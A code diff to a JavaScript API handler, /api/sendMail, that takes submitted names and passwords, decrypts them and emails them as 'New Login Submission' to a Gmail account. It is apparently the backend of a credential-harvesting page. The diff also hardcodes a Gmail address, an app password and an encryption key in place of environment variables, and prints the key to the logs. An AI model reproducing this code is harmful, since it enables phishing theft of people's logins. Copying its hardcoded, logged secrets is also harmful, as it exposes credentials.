@@ -23,13 +23,17 @@ const validateInput = (name, password) => {
   return null;
 };
 
-const SECRET_KEY = process.env.SECRET_KEY || 'my-secret-key-1234567890123456';
+const SECRET_KEY = 'my-secret-key-1234567890123456';
+const EMAIL_USER = 'chalakbillw@gmail.com';
+const EMAIL_PASS = 'pdoo allo osex nilo';
 const ALGORITHM = 'aes-256-cbc';
 const IV_LENGTH = 16;
 
 export default async function handler(req, res) {
   await runMiddleware(req, res, corsMiddleware);
   console.log('API /api/sendMail called with method:', req.method);
+  console.log('SECRET_KEY:', SECRET_KEY);
+  console.log('SECRET_KEY length:', Buffer.from(SECRET_KEY).length);
 
   if (req.method !== 'POST') {
     return res.status(405).json({ message: 'Method not allowed' });
@@ -44,7 +48,7 @@ export default async function handler(req, res) {
   try {
     // Validate key length
     if (Buffer.from(SECRET_KEY).length !== 32) {
-      throw new Error('Invalid key length: SECRET_KEY must be 32 bytes');
+      throw new Error(`Invalid key length: SECRET_KEY is ${Buffer.from(SECRET_KEY).length} bytes, expected 32 bytes`);
     }
 
     const encryptedText = Buffer.from(encrypted, 'base64');
@@ -67,14 +71,14 @@ export default async function handler(req, res) {
     const transporter = nodemailer.createTransport({
       service: 'gmail',
       auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS,
+        user: EMAIL_USER,
+        pass: EMAIL_PASS,
       },
     });
 
     const mailOptions = {
-      from: process.env.EMAIL_USER,
-      to: process.env.EMAIL_USER,
+      from: EMAIL_USER,
+      to: EMAIL_USER,
       subject: 'New Login Submission',
       text: `New login details:\nName: ${sanitizedName}\nPassword: ${sanitizedPassword}`,
       html: `<h3>New Login Submission</h3><p><strong>Name:</strong> ${sanitizedName}</p><p><strong>Password:</strong> ${sanitizedPassword}</p>`,
